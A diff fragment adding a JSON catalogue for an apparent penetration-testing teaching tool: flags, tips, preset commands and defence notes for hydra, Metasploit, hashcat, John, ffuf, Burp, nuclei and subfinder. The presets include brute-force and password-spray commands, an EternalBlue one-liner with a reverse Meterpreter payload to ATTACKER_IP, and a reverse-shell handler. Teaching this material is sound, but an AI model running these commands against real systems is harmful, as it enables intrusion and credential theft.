+      "-C":  { "label": "Colon-Separated File", "desc": "Use user:pass format file instead of separate -L and -P.", "example": "hydra -C default_creds.txt 192.168.1.1 ftp", "teach": "Default credential lists in user:pass format are perfect for -C. admin:admin, root:toor, admin:password.", "risk": "noisy" }
+    },
+    "preset_profiles": {
+      "SSH Spray":      { "flags": ["-l", "root", "-P", "/usr/share/wordlists/rockyou.txt", "-t", "4", "-f", "{target}", "ssh"], "desc": "SSH root brute force, fail2ban-safe threading." },
+      "FTP Default":    { "flags": ["-C", "/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt", "-t", "10", "{target}", "ftp"], "desc": "FTP default credential check." },
+      "HTTP Form":      { "flags": ["-l", "admin", "-P", "/usr/share/wordlists/rockyou.txt", "-t", "20", "{target}", "http-post-form", "'/login:username=^USER^&password=^PASS^:Invalid'"], "desc": "HTTP POST login form attack." },
+      "Password Spray": { "flags": ["-L", "/usr/share/seclists/Usernames/top-usernames-shortlist.txt", "-p", "Password1!", "-t", "4", "-f", "{target}", "ssh"], "desc": "Single password spray across common usernames." },
+      "RDP Attack":     { "flags": ["-l", "administrator", "-P", "/usr/share/wordlists/rockyou.txt", "-t", "4", "-f", "{target}", "rdp"], "desc": "RDP administrator brute force." }
+    },
+    "defend_notes": "Brute force attacks generate massive authentication failure logs. Implement: account lockout after 5 failures, fail2ban on SSH, MFA on all remote access, rate limiting on login forms. Monitor for rapid sequential failed logins from one IP. SSH key-based auth makes password brute force impossible. Never expose RDP directly to the internet.",
+    "mitre_techniques": ["T1110.001 - Brute Force: Password Guessing", "T1110.003 - Brute Force: Password Spraying"]
+  },
+
+  "metasploit": {
+    "name": "Metasploit Framework",
+    "binary": "msfconsole",
+    "category": "exploitation",
+    "description": "The world's most widely used penetration testing framework. Contains 2000+ exploits, 500+ payloads, and hundreds of auxiliary/post modules. Industry standard for exploit development, payload delivery, and post-exploitation.",
+    "teach_intro": "Metasploit organizes attacks into modules: exploits (break in), payloads (what runs after), auxiliaries (scanners/fuzzers), post (after compromise). The workflow is always: search → use → set options → run. msfconsole is your command center.",
+    "default_command": "msfconsole -q",
+    "flags": {
+      "-q":       { "label": "Quiet Mode", "desc": "Start without the ASCII banner. Faster startup.", "example": "msfconsole -q", "teach": "The -q flag skips the splash screen. In professional engagements you want clean terminal output.", "risk": "safe" },
+      "-x":       { "label": "Execute Command", "desc": "Run MSF commands on startup: -x 'use exploit/...; set RHOSTS ...; run'", "example": "msfconsole -q -x 'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 192.168.1.0/24; run'", "teach": "-x lets you script MSF. Perfect for automation — pre-load modules and options without manual interaction.", "risk": "noisy" },
+      "-r":       { "label": "Resource Script", "desc": "Run a .rc script file of MSF commands.", "example": "msfconsole -r scan.rc", "teach": "Resource scripts are MSF automation files. db_import nmap.xml; vulns; hosts; services — chain them all.", "risk": "noisy" },
+      "search":   { "label": "Search Modules", "desc": "Search for exploits: search eternalblue / search type:exploit platform:windows", "example": "search ms17-010", "teach": "Search by CVE, name, platform, or type. 'search type:exploit platform:linux rank:excellent' finds reliable Linux exploits.", "risk": "safe" },
+      "use":      { "label": "Select Module", "desc": "Load a module: use exploit/windows/smb/ms17_010_eternalblue", "example": "use exploit/windows/smb/ms17_010_eternalblue", "teach": "After search, use the module number or full path. Then 'show options' to see what you need to configure.", "risk": "safe" },
+      "set":      { "label": "Set Option", "desc": "Configure module options: set RHOSTS 192.168.1.1 / set LHOST 10.10.10.1 / set PAYLOAD windows/x64/meterpreter/reverse_tcp", "example": "set RHOSTS 192.168.1.1", "teach": "RHOSTS = remote target. LHOST = your IP (the callback). LPORT = your listening port. Always verify with 'show options' before running.", "risk": "safe" },
+      "run":      { "label": "Execute Module", "desc": "Run the configured module. Also: exploit", "example": "run", "teach": "'run' and 'exploit' are identical. After getting a shell, you'll see 'meterpreter >' — you're in.", "risk": "very_noisy" },
+      "db_import":{ "label": "Import Nmap Scan", "desc": "Import nmap XML results into MSF database.", "example": "db_import /tmp/nmap_scan.xml", "teach": "After db_import, run 'hosts' and 'services' to see all discovered systems. MSF tracks your recon automatically.", "risk": "safe" },
+      "vulns":    { "label": "Show Vulnerabilities", "desc": "Display vulnerabilities found by scanners in the MSF database.", "example": "vulns", "teach": "After running scanner auxiliaries, 'vulns' shows all confirmed vulnerabilities. Each one is an exploit candidate.", "risk": "safe" },
+      "sessions": { "label": "List Sessions", "desc": "Show all active Meterpreter/shell sessions.", "example": "sessions -l", "teach": "sessions -l lists all open connections. sessions -i 1 interacts with session 1. You can have dozens open simultaneously.", "risk": "safe" },
+      "background":{ "label": "Background Session", "desc": "Background the current session and return to msfconsole.", "example": "background", "teach": "Hit Ctrl+Z or type 'background' to background a Meterpreter session. Return with 'sessions -i [id]'.", "risk": "safe" }
+    },
+    "preset_profiles": {
+      "EternalBlue":   { "flags": ["-q", "-x", "'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; run'"], "desc": "MS17-010 EternalBlue exploit — Windows SMB." },
+      "SMB Scanner":   { "flags": ["-q", "-x", "'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS {target}; run'"], "desc": "Scan network for EternalBlue vulnerability." },
+      "Port Scanner":  { "flags": ["-q", "-x", "'use auxiliary/scanner/portscan/tcp; set RHOSTS {target}; set PORTS 1-1024; run'"], "desc": "MSF TCP port scanner." },
+      "Multi Handler": { "flags": ["-q", "-x", "'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run'"], "desc": "Catch incoming reverse shell connections." }
+    },
+    "defend_notes": "Meterpreter lives in memory and avoids touching disk — traditional AV misses it. EDR solutions (CrowdStrike, SentinelOne) detect process injection and C2 beaconing. Monitor for: unusual LSASS access, PowerShell spawning from unexpected parents, outbound connections on 4444/4445. Metasploit's default staging port (4444) is trivially blocked by egress filtering.",
+    "mitre_techniques": ["T1190 - Exploit Public-Facing Application", "T1055 - Process Injection", "T1059 - Command and Scripting Interpreter"]
+  },
+
+  "hashcat": {
+    "name": "Hashcat",
+    "binary": "hashcat",
+    "category": "credentials",
+    "description": "The world's fastest password recovery tool. GPU-accelerated cracking of MD5, SHA1, SHA256, bcrypt, NTLM, WPA2, and 300+ hash types. Can process billions of candidates per second on modern GPUs.",
+    "teach_intro": "Hashcat doesn't try to 'decrypt' hashes — it generates candidates and hashes them, comparing to your target. On a modern GPU it can try billions of passwords per second. The key is attack mode: dictionary (-a 0), combinator (-a 1), bruteforce (-a 3), rule-based (-a 0 with -r).",
+    "default_command": "hashcat -m 0 -a 0 {target} /usr/share/wordlists/rockyou.txt",
+    "flags": {
+      "-m":   { "label": "Hash Type", "desc": "Hash mode number. 0=MD5, 100=SHA1, 1000=NTLM, 1800=sha512crypt, 3200=bcrypt, 22000=WPA2.", "example": "hashcat -m 1000 hashes.txt rockyou.txt", "teach": "Always identify the hash type first. Use hash-identifier or hashid. Wrong -m = zero results. NTLM (1000) is Windows, MD5 (0) is common web apps.", "risk": "safe" },
+      "-a":   { "label": "Attack Mode", "desc": "0=Dictionary, 1=Combinator, 3=Brute-force mask, 6=Dict+mask, 7=mask+Dict.", "example": "hashcat -m 0 -a 0 hash.txt rockyou.txt", "teach": "Mode 0 (dictionary) with rockyou.txt cracks 60-80% of real-world hashes. Mode 3 (brute force) with masks covers the rest.", "risk": "safe" },
+      "-r":   { "label": "Rule File", "desc": "Apply transformation rules to wordlist: -r rules/best64.rule", "example": "hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule", "teach": "Rules transform words: password → P@ssw0rd!, admin → Admin123. best64.rule applies 64 transformations to every word — multiplies your coverage massively.", "risk": "safe" },
+      "--show":{ "label": "Show Cracked", "desc": "Display previously cracked hashes from the potfile.", "example": "hashcat --show hash.txt", "teach": "Hashcat saves cracked passwords in ~/.hashcat/hashcat.potfile. --show retrieves them without cracking again.", "risk": "safe" },
+      "--wordlist":{ "label": "Wordlist", "desc": "Path to wordlist. rockyou.txt is default, seclists has many specialized lists.", "example": "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt", "teach": "rockyou.txt (14M passwords) covers most. For targeted attacks, generate custom wordlists with CeWL from the target's website.", "risk": "safe" },
+      "-O":   { "label": "Optimized Kernels", "desc": "Enable optimized kernels — faster but limited to max 32 char passwords.", "example": "hashcat -m 0 -a 0 -O hash.txt rockyou.txt", "teach": "-O nearly doubles cracking speed. Most real passwords are under 32 chars so this is usually safe to use.", "risk": "safe" },
+      "--increment":{ "label": "Brute Force Increment", "desc": "Start brute force from min length and increment up. Use with -a 3.", "example": "hashcat -m 0 -a 3 --increment -i hash.txt ?a?a?a?a?a?a", "teach": "?a = all chars. Start with 4 chars and work up to 8. Catches short passwords first before long ones.", "risk": "safe" },
+      "--status":{ "label": "Status Update", "desc": "Show real-time status of cracking session.", "example": "hashcat -m 0 -a 0 hash.txt rockyou.txt --status", "teach": "Press 's' during cracking to get status. Shows speed, progress percentage, estimated time remaining.", "risk": "safe" }
+    },
+    "preset_profiles": {
+      "MD5 Dict":      { "flags": ["-m", "0", "-a", "0", "{target}", "/usr/share/wordlists/rockyou.txt", "-O"], "desc": "MD5 dictionary attack with optimized kernels." },
+      "NTLM Dict":     { "flags": ["-m", "1000", "-a", "0", "{target}", "/usr/share/wordlists/rockyou.txt", "-O"], "desc": "Windows NTLM hash dictionary attack." },
+      "WPA2 Crack":    { "flags": ["-m", "22000", "-a", "0", "{target}", "/usr/share/wordlists/rockyou.txt"], "desc": "WPA2 WiFi handshake crack." },
+      "Rules Attack":  { "flags": ["-m", "0", "-a", "0", "{target}", "/usr/share/wordlists/rockyou.txt", "-r", "/usr/share/hashcat/rules/best64.rule", "-O"], "desc": "Dictionary + best64 rules — high coverage." },
+      "Brute 8 Char":  { "flags": ["-m", "0", "-a", "3", "{target}", "?a?a?a?a?a?a?a?a", "-O"], "desc": "Full brute force up to 8 character passwords." }
+    },
+    "defend_notes": "Strong hashing algorithms (bcrypt, Argon2, scrypt) slow GPU cracking dramatically. bcrypt with cost factor 12 takes minutes per hash vs billions/second for MD5. Never store plaintext or MD5/SHA1 passwords. Enforce password complexity to reduce wordlist hits. Salted hashes prevent rainbow table attacks.",
+    "mitre_techniques": ["T1110.002 - Brute Force: Password Cracking", "T1003 - OS Credential Dumping"]
+  },
+
+  "john": {
+    "name": "John the Ripper",
+    "binary": "john",
+    "category": "credentials",
+    "description": "Classic CPU-based password cracker. Auto-detects hash types, cracks /etc/shadow files, ZIP/RAR passwords, SSH key passphrases, Office documents. Where hashcat uses GPU power, John uses smart wordlist mangling and CPU efficiency.",
+    "teach_intro": "John auto-detects hash formats and applies built-in mangling rules. It's slower than hashcat on simple hashes but excels at cracking files (ZIP, PDF, SSH keys) via its companion tools: zip2john, ssh2john, pdf2john. The workflow is: convert the file to a John-format hash, then crack it.",
+    "default_command": "john {target} --wordlist=/usr/share/wordlists/rockyou.txt",
+    "flags": {
+      "--wordlist":  { "label": "Wordlist Mode", "desc": "Dictionary attack with specified wordlist.", "example": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt", "teach": "Most cracks happen here. rockyou.txt covers real-world passwords. John applies mangling rules on top automatically.", "risk": "safe" },
+      "--format":    { "label": "Force Hash Format", "desc": "Specify hash type when auto-detect fails: --format=NT, --format=sha512crypt, --format=bcrypt.", "example": "john hashes.txt --format=NT --wordlist=rockyou.txt", "teach": "Auto-detect usually works. Force it when you know the hash type. Use 'john --list=formats' to see all supported types.", "risk": "safe" },
+      "--rules":     { "label": "Mangling Rules", "desc": "Apply transformation rules to the wordlist.", "example": "john hashes.txt --wordlist=rockyou.txt --rules", "teach": "Rules transform: password → P@ssword1!, admin → @dm1n. John's built-in rules are aggressive and catch common substitutions.", "risk": "safe" },
+      "--incremental":{ "label": "Brute Force Mode", "desc": "Full character brute force. Slow but thorough.", "example": "john hashes.txt --incremental", "teach": "Incremental tries all character combinations. Use as last resort — can take days for long passwords.", "risk": "safe" },
+      "--show":      { "label": "Show Cracked", "desc": "Display all cracked passwords from the session.", "example": "john hashes.txt --show", "teach": "John saves cracked passwords in ~/.john/john.pot. --show reads them back without re-cracking.", "risk": "safe" },
+      "--pot":       { "label": "Potfile Location", "desc": "Specify custom potfile location.", "example": "john hashes.txt --pot=custom.pot --wordlist=rockyou.txt", "teach": "Useful when sharing cracking sessions or keeping separate potfiles per engagement.", "risk": "safe" },
+      "--fork":      { "label": "Multi-Process", "desc": "Run N parallel John processes on multi-core CPU.", "example": "john hashes.txt --fork=4 --wordlist=rockyou.txt", "teach": "Use all CPU cores: --fork=4 for quad-core. Not as fast as GPU but great for file cracking where GPU can't help.", "risk": "safe" }
+    },
+    "preset_profiles": {
+      "Shadow File":   { "flags": ["{target}", "--wordlist=/usr/share/wordlists/rockyou.txt", "--rules"], "desc": "Crack /etc/shadow Linux password file." },
+      "SSH Key":       { "flags": ["{target}", "--wordlist=/usr/share/wordlists/rockyou.txt"], "desc": "Crack SSH private key passphrase (run ssh2john first)." },
+      "ZIP Password":  { "flags": ["{target}", "--wordlist=/usr/share/wordlists/rockyou.txt"], "desc": "Crack ZIP archive password (run zip2john first)." },
+      "NT Hashes":     { "flags": ["{target}", "--format=NT", "--wordlist=/usr/share/wordlists/rockyou.txt", "--rules"], "desc": "Crack Windows NT/NTLM hashes." }
+    },
+    "defend_notes": "Same mitigations as hashcat — use strong hashing algorithms. For file encryption: use AES-256 with strong passphrases. SSH keys should use ED25519 with a strong passphrase. For Linux systems: use yescrypt or bcrypt in /etc/pam.d/common-password instead of SHA512.",
+    "mitre_techniques": ["T1110.002 - Brute Force: Password Cracking"]
+  },
+
+  "ffuf": {
+    "name": "FFUF",
+    "binary": "ffuf",
+    "category": "web",
+    "description": "Fuzz Faster U Fool — extremely fast web fuzzer written in Go. Used for directory brute forcing, parameter fuzzing, virtual host discovery, and API endpoint enumeration. Often faster than gobuster with more flexible filtering.",
+    "teach_intro": "FFUF replaces the keyword FUZZ in a URL/header/body with wordlist entries. It's incredibly versatile — fuzz directories, GET/POST parameters, headers, cookies, or anything. The filtering options (-fc, -fs, -fw, -fl) let you hide noise and surface only interesting responses.",
+    "default_command": "ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/dirb/common.txt",
+    "flags": {
+      "-u":    { "label": "URL with FUZZ", "desc": "Target URL. Place FUZZ where you want to inject wordlist entries.", "example": "ffuf -u http://target.com/FUZZ -w common.txt", "teach": "FUZZ is a placeholder. It can go anywhere in the URL: /FUZZ, /?param=FUZZ, in headers. Multiple FUZZ positions are possible.", "risk": "noisy" },
+      "-w":    { "label": "Wordlist", "desc": "Wordlist file path. Use W1:FILE syntax for multiple wordlists.", "example": "ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt", "teach": "For dir fuzzing: dirb/common.txt (fast) or dirbuster/directory-list-2.3-medium.txt (thorough). For params: burp-parameter-names.txt from seclists.", "risk": "safe" },
+      "-fc":   { "label": "Filter Status Code", "desc": "Hide responses with specific HTTP status codes: -fc 404,400", "example": "ffuf -u http://target.com/FUZZ -w common.txt -fc 404", "teach": "Filter out 404s to see only valid paths. Add -fc 403 to hide forbidden too, or keep 403s — they mean the path exists.", "risk": "safe" },
+      "-fs":   { "label": "Filter Size", "desc": "Hide responses of specific byte size: -fs 1234 (hides the 'not found' page size).", "example": "ffuf -u http://target.com/FUZZ -w common.txt -fs 5120", "teach": "Most 'not found' pages are the same size. Find out the size of the 404 page with curl, then filter it out. Everything else is interesting.", "risk": "safe" },
+      "-fw":   { "label": "Filter Word Count", "desc": "Hide responses with specific word count.", "example": "ffuf -u http://target.com/FUZZ -w common.txt -fw 200", "teach": "Alternative to -fs when the server varies 404 sizes. Word count is more stable than byte count for detecting real content.", "risk": "safe" },
+      "-mc":   { "label": "Match Status Code", "desc": "Only show responses with specific status codes: -mc 200,301,302,403", "example": "ffuf -u http://target.com/FUZZ -w common.txt -mc 200,301,403", "teach": "Whitelist approach vs blacklist (-fc). Only show what you care about. 200 = accessible, 301 = redirects, 403 = exists but forbidden.", "risk": "safe" },
+      "-t":    { "label": "Threads", "desc": "Number of concurrent threads. Default 40.", "example": "ffuf -u http://target.com/FUZZ -w common.txt -t 80", "teach": "FFUF defaults to 40 threads which is already fast. -t 80+ on reliable servers. Reduce to 10 for rate-limited targets.", "risk": "noisy" },
+      "-H":    { "label": "Custom Header", "desc": "Add custom HTTP header: -H 'Host: FUZZ' for vhost fuzzing.", "example": "ffuf -u http://10.10.10.1/ -w vhosts.txt -H 'Host: FUZZ.target.com'", "teach": "Virtual host fuzzing! Change the Host header to discover hidden vhosts on the same IP. Internal apps often lurk here.", "risk": "noisy" },
+      "-d":    { "label": "POST Data", "desc": "Send POST request with fuzz point in body.", "example": "ffuf -u http://target.com/login -w common.txt -d 'username=FUZZ&password=test' -H 'Content-Type: application/x-www-form-urlencoded'", "teach": "POST body fuzzing finds parameter vulnerabilities. FUZZ in the username or password field can reveal SQLi, XSS, or logic flaws.", "risk": "noisy" },
+      "-o":    { "label": "Output File", "desc": "Save results: -o results.json -of json", "example": "ffuf -u http://target.com/FUZZ -w common.txt -o results.json -of json", "teach": "JSON output is parseable — pipe it into jq for filtering. HTML output is great for reports.", "risk": "safe" },
+      "-recursion":{ "label": "Recursive Mode", "desc": "Automatically fuzz discovered directories recursively.", "example": "ffuf -u http://target.com/FUZZ -w common.txt -recursion -recursion-depth 2", "teach": "Recursion finds /admin/config/, /api/v1/users/ etc. Set -recursion-depth 2-3 to avoid infinite loops.", "risk": "very_noisy" },
+      "-e":    { "label": "Extensions", "desc": "Append extensions to each word: -e .php,.html,.txt,.bak", "example": "ffuf -u http://target.com/FUZZ -w common.txt -e .php,.bak,.txt", "teach": "Extensions turn 'admin' into 'admin.php', 'admin.bak', 'admin.txt'. Backup files (.bak, .old, ~) are goldmines.", "risk": "noisy" }
+    },
+    "preset_profiles": {
+      "Quick Dir":      { "flags": ["-u", "http://{target}/FUZZ", "-w", "/usr/share/wordlists/dirb/common.txt", "-fc", "404", "-t", "40"], "desc": "Fast directory fuzzing." },
+      "Deep Dir":       { "flags": ["-u", "http://{target}/FUZZ", "-w", "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt", "-fc", "404", "-e", ".php,.html,.bak,.txt", "-t", "40"], "desc": "Thorough directory + extension fuzz." },
+      "VHost Fuzz":     { "flags": ["-u", "http://{target}/", "-w", "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt", "-H", "'Host: FUZZ.{target}'", "-fc", "404,400"], "desc": "Virtual host discovery." },
+      "Param Fuzz":     { "flags": ["-u", "http://{target}/page?FUZZ=test", "-w", "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt", "-fc", "404"], "desc": "GET parameter name fuzzing." },
+      "Recursive":      { "flags": ["-u", "http://{target}/FUZZ", "-w", "/usr/share/wordlists/dirb/common.txt", "-recursion", "-recursion-depth", "2", "-fc", "404"], "desc": "Recursive directory discovery." }
+    },
+    "defend_notes": "FFUF generates massive 404 floods identifiable by request volume and sequential path patterns. WAFs detect this automatically. Rate limiting, Cloudflare, and fail2ban all catch directory fuzzing. Consider returning identical responses for all non-existent paths (same size/content) to defeat size-based filtering.",
+    "mitre_techniques": ["T1083 - File and Directory Discovery", "T1595.003 - Active Scanning: Wordlist Scanning"]
+  },
+
+  "burpsuite": {
+    "name": "Burp Suite",
+    "binary": "burpsuite",
+    "category": "web",
+    "description": "The premier web application security testing platform. Intercepts, modifies, and replays HTTP/HTTPS traffic. Includes: Proxy, Repeater, Intruder (fuzzer), Scanner, Decoder, Sequencer, and Comparer. Used by nearly every professional web pen tester.",
+    "teach_intro": "Burp Suite sits between your browser and the web server, capturing every request and response. You can pause requests, modify them, replay them, and send them to specialized tools. The Proxy tab shows live traffic. Repeater lets you modify and resend. Intruder automates fuzzing.",
+    "default_command": "burpsuite &",
+    "flags": {
+      "--project-file": { "label": "Project File", "desc": "Load/create a project file to save work between sessions.", "example": "burpsuite --project-file=engagement.burp", "teach": "Project files save all captured traffic, findings, and notes. Always create a project file for real engagements.", "risk": "safe" },
+      "--config-file":  { "label": "Config File", "desc": "Load Burp configuration from JSON file.", "example": "burpsuite --config-file=burp_config.json", "teach": "Config files let you pre-configure proxy settings, scope, and scan options. Great for consistent engagement setup.", "risk": "safe" },
+      "Proxy":          { "label": "Intercept Mode", "desc": "The core feature — intercept HTTP/HTTPS between browser and server.", "example": "Configure browser to proxy through 127.0.0.1:8080", "teach": "Set your browser proxy to 127.0.0.1:8080. All traffic flows through Burp. Toggle Intercept to pause/modify requests before they reach the server.", "risk": "safe" },
+      "Repeater":       { "label": "Repeater Tab", "desc": "Modify and resend individual HTTP requests manually. Right-click any request → Send to Repeater.", "example": "Right-click request → Send to Repeater → Modify → Send", "teach": "Repeater is where you probe for vulnerabilities. Change parameter values, inject payloads, see exactly how the server responds. Manual testing at its finest.", "risk": "safe" },
+      "Intruder":       { "label": "Intruder (Fuzzer)", "desc": "Automated fuzzing/brute forcing. Mark payload positions with § symbols. Right-click → Send to Intruder.", "example": "Send login request to Intruder, mark password field, set payload list, attack", "teach": "Intruder attack types: Sniper (one position, one list), Battering Ram (same payload everywhere), Pitchfork (multiple lists in sync), Cluster Bomb (all combos).", "risk": "very_noisy" },
+      "Decoder":        { "label": "Decoder Tab", "desc": "Encode/decode: Base64, URL, HTML, hex, gzip, JWT etc.", "example": "Paste token → Decode as Base64 → Decode as URL → see plaintext", "teach": "JWT tokens, session cookies, and hidden fields are often encoded. Decode them to find embedded data like user IDs, permissions, or expiry timestamps.", "risk": "safe" },
+      "Comparer":       { "label": "Comparer Tab", "desc": "Diff two requests or responses to spot differences.", "example": "Send two responses to Comparer → compare word/byte differences", "teach": "Compare successful vs failed login responses. Even tiny differences reveal logic flaws — different word counts, error messages, or response times.", "risk": "safe" }
+    },
+    "preset_profiles": {
+      "Start Proxy":    { "flags": ["&"], "desc": "Launch Burp Suite GUI. Configure browser to use 127.0.0.1:8080." },
+      "With Project":   { "flags": ["--project-file=engagement.burp"], "desc": "Launch with a saved project file." }
+    },
+    "defend_notes": "Burp Suite attacks are typically manual and targeted — harder to detect via volume alone. Look for unusual headers (X-Burp, User-Agent: Burp), sequential parameter manipulation in logs, and repeated identical requests with slight variations. The Community edition throttles Intruder attacks — Pro bypasses this. Implement WAF rules for known Burp payload patterns.",
+    "mitre_techniques": ["T1190 - Exploit Public-Facing Application", "T1040 - Network Sniffing"]
+  },
+
+  "nuclei": {
+    "name": "Nuclei",
+    "binary": "nuclei",
+    "category": "vuln_scan",
+    "description": "Fast, template-based vulnerability scanner. Runs thousands of community-maintained YAML templates against targets. Checks for CVEs, misconfigurations, exposed panels, default credentials, XSS, SQLi, SSRF, and more. ProjectDiscovery's flagship scanner.",
+    "teach_intro": "Nuclei uses YAML templates — each one describes how to detect a specific vulnerability. The community maintains 6000+ templates covering every CVE you can think of. It's the fastest way to scan for known vulnerabilities across a large number of targets.",
+    "default_command": "nuclei -u http://{target} -s critical,high,medium",
+    "flags": {
+      "-u":   { "label": "Single URL Target", "desc": "Scan a single URL target.", "example": "nuclei -u http://target.com", "teach": "Single target mode. Nuclei runs all matching templates and reports findings with severity ratings.", "risk": "noisy" },
+      "-l":   { "label": "Target List", "desc": "File containing list of URLs to scan.", "example": "nuclei -l targets.txt", "teach": "Mass scanning — feed nuclei a list of URLs from subfinder/httpx output. Covers entire web attack surface at once.", "risk": "very_noisy" },
+      "-t":   { "label": "Specific Template", "desc": "Run a specific template or directory of templates.", "example": "nuclei -u http://target.com -t cves/2021/CVE-2021-44228.yaml", "teach": "Run specific CVE templates for targeted testing. nuclei -t cves/ tests all CVE templates. nuclei -t exposures/ finds exposed sensitive data.", "risk": "noisy" },
+      "-s":   { "label": "Severity Filter", "desc": "Filter by severity: critical, high, medium, low, info.", "example": "nuclei -u http://target.com -s critical,high", "teach": "Start with critical and high. Info templates generate a lot of noise. Focus on actionable findings first.", "risk": "safe" },
+      "-tags":{ "label": "Tag Filter", "desc": "Filter templates by tag: -tags cve,sqli,xss,ssrf,rce", "example": "nuclei -u http://target.com -tags rce,sqli", "teach": "Tags let you target specific vuln classes. -tags rce finds remote code execution opportunities. -tags default-login checks default credentials.", "risk": "noisy" },
+      "-c":   { "label": "Concurrency", "desc": "Number of parallel template executions. Default 25.", "example": "nuclei -u http://target.com -c 50", "teach": "Higher concurrency = faster scans. On stable targets use -c 50-100. Reduce for rate-limited or sensitive targets.", "risk": "noisy" },
+      "-o":   { "label": "Output File", "desc": "Save results to file.", "example": "nuclei -u http://target.com -o results.txt", "teach": "Always save output. Nuclei findings with CVE numbers are ready-made report evidence.", "risk": "safe" },
+      "-json":{ "label": "JSON Output", "desc": "Output results in JSON format for parsing.", "example": "nuclei -u http://target.com -json -o results.json", "teach": "JSON output integrates with other tools and SIEM platforms. Each finding includes template name, severity, matched value, and URL.", "risk": "safe" },
+      "-rl":  { "label": "Rate Limit", "desc": "Max requests per second: -rl 100", "example": "nuclei -u http://target.com -rl 50", "teach": "Rate limiting prevents overwhelming the target and triggering WAF blocks. Use -rl 10-50 for sensitive production targets.", "risk": "safe" },
+      "-headless":{ "label": "Headless Browser", "desc": "Enable headless Chrome for JavaScript-rendered targets.", "example": "nuclei -u http://target.com -headless", "teach": "Single-page apps and React/Angular frontends need headless mode. Nuclei uses Chrome to render JS before scanning.", "risk": "noisy" }
+    },
+    "preset_profiles": {
+      "Critical Only":  { "flags": ["-u", "http://{target}", "-s", "critical"], "desc": "Only critical severity findings." },
+      "Full Scan":      { "flags": ["-u", "http://{target}", "-s", "critical,high,medium", "-c", "25"], "desc": "Standard full vulnerability scan." },
+      "CVE Hunt":       { "flags": ["-u", "http://{target}", "-tags", "cve", "-s", "critical,high"], "desc": "Scan for known CVEs only." },
+      "Default Creds":  { "flags": ["-u", "http://{target}", "-tags", "default-login"], "desc": "Check for default credential exposure." },
+      "Mass Scan":      { "flags": ["-l", "{target}", "-s", "critical,high", "-c", "50", "-o", "nuclei_results.txt"], "desc": "Mass scan from URL list file." }
+    },
+    "defend_notes": "Nuclei generates distinctive HTTP patterns matching known exploit signatures. WAFs with CVE rule sets (Cloudflare, AWS WAF, ModSecurity CRS) block most templates. Keep software updated — Nuclei's power comes from known vulnerabilities. Subscribe to NVD and vendor advisories for early warning.",
+    "mitre_techniques": ["T1595.002 - Active Scanning: Vulnerability Scanning", "T1190 - Exploit Public-Facing Application"]
+  },
+
+  "subfinder": {
+    "name": "Subfinder",
+    "binary": "subfinder",
+    "category": "recon",
+    "description": "Passive subdomain discovery tool. Queries 40+ public data sources (Certificate Transparency, DNS databases, APIs, Shodan, VirusTotal) without sending any packets to the target. Completely passive OSINT recon.",
+    "teach_intro": "Subfinder finds subdomains without touching the target — it asks public databases. dev.target.com, staging.target.com, api.target.com, vpn.target.com — all potentially exposed and forgotten. Attack surface is almost always larger than the main domain suggests.",
+    "default_command": "subfinder -d {target} -silent",
+    "flags": {
+      "-d":       { "label": "Target Domain", "desc": "Root domain to enumerate subdomains for.", "example": "subfinder -d target.com", "teach": "Give subfinder the apex domain. It queries CT logs, VirusTotal, Shodan, and 40+ other sources. dev, staging, api subdomains frequently have weaker security.", "risk": "quiet" },
+      "-silent":  { "label": "Silent Mode", "desc": "Only output found subdomains. Perfect for piping into other tools.", "example": "subfinder -d target.com -silent | httpx", "teach": "Silent mode is pipeline-ready. Output goes straight to httpx (check which are live) → then nuclei (scan each one).", "risk": "quiet" },
+      "-o":       { "label": "Output File", "desc": "Save discovered subdomains to file.", "example": "subfinder -d target.com -o subdomains.txt", "teach": "Save the list. Feed it to gobuster (dns mode), ffuf (vhost mode), httpx (aliveness check), then nuclei (scan all live ones).", "risk": "safe" },
+      "-all":     { "label": "All Sources", "desc": "Use all available data sources (requires API keys for some).", "example": "subfinder -d target.com -all", "teach": "Without -all, subfinder uses free sources only. With API keys for Shodan, VirusTotal, Censys configured in ~/.config/subfinder/config.yaml, -all dramatically increases results.", "risk": "quiet" },
+      "-recursive":{ "label": "Recursive Discovery", "desc": "Recursively find subdomains of discovered subdomains.", "example": "subfinder -d target.com -recursive", "teach": "target.com → dev.target.com → db.dev.target.com. Deep recursion reveals internal-facing services accidentally exposed.", "risk": "quiet" },
+      "-t":       { "label": "Threads", "desc": "Number of concurrent goroutines. Default 10.", "example": "subfinder -d target.com -t 20", "teach": "More threads = faster enumeration across sources. Not limited by network since it's querying APIs, not the target.", "risk": "quiet" }
+    },
+    "preset_profiles": {
+      "Quick Passive":  { "flags": ["-d", "{target}", "-silent"], "desc": "Fast passive enumeration, clean output." },
+      "Full with File": { "flags": ["-d", "{target}", "-all", "-o", "subdomains.txt"], "desc": "All sources, save to file." },
+      "Pipeline":       { "flags": ["-d", "{target}", "-silent", "|", "httpx", "-silent", "|", "nuclei", "-s", "critical,high"], "desc": "Full recon pipeline: subs → alive → scan." }
+    },
+    "defend_notes": "Subfinder is completely passive — you cannot detect it since it never touches your infrastructure. Defense is asset management: know what subdomains you own, use certificate transparency monitoring (Facebook CT Monitor, crt.sh alerts), and take down forgotten/orphaned subdomains. Enable HTTPS on all subdomains including internal ones.",
+    "mitre_techniques": ["T1596.003 - Search Open Technical Databases: Digital Certificates", "T1596.005 - Search Open Technical Databases: Scan Databases"]
+  },
+
+  "amass": {
+    "name": "AMASS",
+    "binary": "amass",
+    "category": "recon",
+    "description": "In-depth attack surface mapping and asset discovery by OWASP. Combines passive OSINT with active DNS enumeration, certificate transparency, ASN discovery, and network graph building. The most comprehensive subdomain/infrastructure recon tool available.",
